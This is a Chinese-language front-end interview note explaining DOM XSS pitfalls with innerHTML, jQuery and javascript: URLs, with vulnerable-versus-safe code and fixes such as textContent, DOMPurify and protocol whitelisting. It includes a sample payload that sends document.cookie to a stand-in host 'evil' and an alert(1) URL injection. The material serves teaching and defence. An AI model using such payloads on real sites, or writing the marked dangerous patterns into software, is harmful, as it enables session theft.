---
title: [WEB-232] DOM XSS 真实案例：innerHTML 与 jQuery 的坑
date: 2026-11-18
categories: [网络与浏览器]
tags: [前端面试, 面试题或笔试题, 安全]
type: 面试题
---

## WEB-232：DOM XSS 真实案例：innerHTML 与 jQuery 的坑

**答**：
- 案例1：路由参数直接进模板。`el.innerHTML = 'Hello ' + param.name`，URL 带 `?name=<img src=x onerror=fetch('//evil?c='+document.cookie)>` 即注入。
- 案例2：jQuery `$(html)` 或 `.html()` 会执行字符串里的脚本。`$(decodeURIComponent(location.hash.slice(1)))` 是经典事故点。
- 案例3：危险 sink 伪装——`insertAdjacentHTML`、`document.write`、`eval`、`setTimeout('字符串')`、jQuery `attr('href', 'javascript:...')`。
- 案例4：属性注入 `a.href = param.url`，URL 写 `javascript:alert(1)`；防御是校验协议白名单。
- 修复模式：textContent / createElement / 框架插值；必须 HTML 时 DOMPurify；URL 时 `new URL()` 校验协议。

```javascript
// 危险 → 安全改造清单
el.innerHTML = `<b>${userInput}</b>`;        // 危险
el.textContent = userInput;                   // 安全（文本）

el.insertAdjacentHTML('beforeend', html);     // 危险
el.insertAdjacentHTML('beforeend', DOMPurify.sanitize(html)); // 安全

const u = new URL(param, location.origin);
if (!/^https?:$/.test(u.protocol)) return;    // URL 协议白名单
link.href = u.href;
```
